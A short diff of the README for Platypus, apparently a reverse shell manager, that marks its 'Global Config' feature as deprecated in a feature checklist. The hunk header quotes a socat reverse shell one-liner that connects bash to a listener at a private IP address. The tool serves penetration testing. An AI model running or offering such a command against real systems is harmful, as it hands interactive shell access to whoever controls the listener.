@@ -140,7 +140,7 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.174.132:8080
 - [x] Upload file
 - [x] Download file
 - [x] [#13 Add a display current prompt setting](https://github.com/WangYihang/Platypus/issues/13)
-- [x] Global Config (eg. [#9 BlockSameIP](https://github.com/WangYihang/Platypus/pull/9))
+- [x] [DEPRECATED] Global Config (eg. [#9 BlockSameIP](https://github.com/WangYihang/Platypus/pull/9))
 - [x] [#11 Make STDOUT and STDERR distinguishable](https://github.com/WangYihang/Platypus/issues/11)
 - [x] [#23 Case insensitive CLI](https://github.com/WangYihang/Platypus/issues/23)
 - [x] Delete command by [@EddieIvan01](https://github.com/EddieIvan01)
